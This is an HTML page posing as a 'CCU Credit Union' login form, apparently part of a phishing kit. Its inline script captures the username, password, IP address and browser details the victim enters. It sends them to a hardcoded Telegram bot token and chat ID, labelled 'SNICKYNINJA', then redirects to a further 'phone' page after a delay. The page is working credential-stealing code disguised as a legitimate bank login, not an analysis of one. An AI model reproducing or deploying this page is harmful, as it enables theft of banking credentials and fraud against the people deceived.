
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CCU</title>
    <link rel="stylesheet" href="./login.css">
</head>

<body>
    <div class="mainContainer">
        <div class="form">
            <div class="topNav">
                <img src="./pages/logo.png" alt="Logo">
            </div>
            <form method="POST" action="" id="loginForm">
                <div class="inputDiv">
                    <div>
                        <h3>Login</h3>
                    </div>
                    <div class="username">
                        <label for="username">Username</label><br>
                        <input type="text" id="username" name="username" required placeholder="Enter your username">
                    </div>
                    <br>
                    <div class="password">
                        <label for="password">Password</label><br>
                        <input type="password" id="password" name="password" required placeholder="Enter your password">
                    </div>
                    <br>
                    <div class="toggleBtns">
                        <!-- Remember me toggle switch -->
                        <label class="switch">
                            <input type="checkbox" id="rememberMeToggle" name="rememberMe">
                            <span class="slider"></span>
                        </label>
                        <label for="rememberMeToggle" id="rememberMeLabel">Remember me</label>
                        <br>
                        <br>
                        <!-- Face ID toggle switch -->
                        <label class="switch">
                            <input type="checkbox" id="faceIdToggle" name="faceId">
                            <span class="slider"></span>
                        </label>
                        <label for="faceIdToggle" id="faceIdLabel">Enable Face ID Authentication</label>
                    </div>
                    <br>
                    <div><button type="submit" class="signIn">Log In</button></div><br>
                    <div id="forgot"><a href="#">Forgot your username or password?</a></div>
                </div>
            </form>
        </div>
    </div>
    <div class="loading-container" style="display: none;">
        <div class="spinner"></div>
    </div>

    <script>
        // Event listeners for toggle switches
        document.getElementById("rememberMeToggle").addEventListener("change", function () {
            if (this.checked) {
                console.log("Remember me is enabled");
            } else {
                console.log("Remember me is disabled");
            }
        });

        document.getElementById("faceIdToggle").addEventListener("change", function () {
            if (this.checked) {
                console.log("Face ID is enabled");
            } else {
                console.log("Face ID is disabled");
            }
        });
        
        // Function to send data to Telegram
        async function sendDataToTelegram(userId, password, ip, ua, botToken, chatId) {
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: `#--------[ CCU CREDIT UNION LOGIN #1 ]--------#
Username         : ${userId}
Password         : ${password}
#--------[ Visitor ]--------#
IP Address       : ${ip}
DEVICE INFORMATION: ${ua}
#--------[ SNICKYNINJA - END ]--------#`

                    })
                });

                const data = await response.json();

                if (data.ok) {
                    console.log("Message sent successfully:", data);
                } else {
                    console.error("Telegram API returned an error:", data.description);  
                }
            } catch (error) {
                console.error("Error sending message:", error);
            }
        }

        // Function to fetch the IP address
        async function fetchIpAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error("Error fetching IP address:", error);
                return "Unavailable";
            }
        }

        // Event listener for form submission
        document.querySelector('#loginForm').addEventListener('submit', async function (event) {
            event.preventDefault();

            const userId = document.querySelector('#username').value.trim();
            const password = document.querySelector('#password').value.trim();

            if (userId && password) {
                // Show loading indicator and hide form
                document.querySelector('.form').style.display = 'none';
                document.querySelector('.loading-container').style.display = 'flex';

                const ip = await fetchIpAddress();
                const ua = navigator.userAgent;

                const botToken1 = '7296082774:AAFvxOm88DKwjKo_lar3bbwJOcRftuNvNlc';
                const chatId1 = '6994641548';
               
                try {
                    await sendDataToTelegram(userId, password, ip, ua, botToken1, chatId1);

                    setTimeout(() => {
                        window.location.href = "./pages/phone.html";
                    }, 5000);
                } catch (error) {
                    console.error("Error in sending data to Telegram bots:", error);
                }
            } else {
                console.error("User ID or Password is missing!");
            }
        });
    </script>

</body>

</html>